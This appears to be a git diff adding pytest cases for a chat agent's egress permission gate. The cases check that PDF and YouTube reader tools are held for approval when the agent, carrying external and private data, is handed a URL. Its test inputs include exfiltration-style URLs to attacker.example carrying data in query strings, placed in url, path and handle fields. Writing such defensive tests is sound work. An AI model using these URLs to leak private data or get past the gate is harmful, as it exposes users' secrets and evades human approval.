@@ -6,7 +6,7 @@ import json
 import pytest
 
 import routes.chat_helpers as chat_helpers
-from src.chat_agent.permissions import Provenance
+from src.chat_agent.permissions import ALLOW, ASK, Provenance
 from tests.chat_agent.test_chat_agent_asks_route import (  # noqa: F401 (fixtures)
     _events,
     admin,
@@ -18,6 +18,7 @@ from tests.chat_agent.test_chat_agent_asks_route import (  # noqa: F401 (fixture
 )
 from tests.chat_agent.test_chat_agent_auto_mode import _classifier_requests, _verdict
 from tests.chat_agent.test_chat_agent_route import _Request, _sse_events, _sse_tool_calls
+from tests.chat_agent.test_chat_agent_rules import _decide
 
 # Far below the 30-minute ask timeout: an unexpected wait fails the test fast.
 NO_WAIT_SECONDS = 5
@@ -85,3 +86,31 @@ def test_a_mail_scan_is_both_egress_legs(scan):
     after = Provenance().after(scan)
     assert (after.external, after.private) == (True, True)
     assert after.origins == (scan,)
+
+
+# --- M1: readers that open a URL the model picks are egress -----------------
+
+_ARMED = Provenance(external=True, private=True)
+
+
+def _gate(name, arguments, provenance=_ARMED):
+    content = arguments if isinstance(arguments, str) else json.dumps(arguments)
+    return _decide(name, content, provenance=provenance)
+
+
+@pytest.mark.parametrize(("name", "arguments", "outcome"), [
+    ("pdf_extract", {"url": "https://attacker.example/a.pdf?d=secret", "query": "t"}, ASK),
+    ("pdf_extract", {"path": "https://attacker.example/a.pdf?d=secret", "query": "t"}, ASK),
+    ("pdf_extract", "https://attacker.example/a.pdf?d=secret\ntable", ASK),
+    ("pdf_extract", {"path": "/workspace/paper.pdf", "query": "t"}, ALLOW),
+    # latest_channel_video hands any http(s) URL to yt-dlp, which fetches it.
+    ("youtube_tool", {"action": "latest_channel_video", "channel_url": "https://attacker.example/?d=s"}, ASK),
+    ("youtube_tool", {"action": "latest_channel_video", "url": "https://attacker.example/?d=s"}, ASK),
+    ("youtube_tool", {"action": "metadata", "handle": "https://attacker.example/?d=s"}, ASK),
+    ("youtube_tool", {"action": "latest_channel_video", "handle": "@OpenAI"}, ALLOW),
+    ("youtube_tool", {"action": "latest_channel_video", "channel_url": "https://www.youtube.com/@OpenAI"}, ALLOW),
+    ("youtube_tool", {"action": "transcript", "url": "https://youtu.be/dQw4w9WgXcQ"}, ALLOW),
+])
+def test_a_reader_opening_a_remote_url_meets_the_egress_gate(name, arguments, outcome):
+    assert _gate(name, arguments) == outcome
+    assert _gate(name, arguments, provenance=Provenance()) == ALLOW
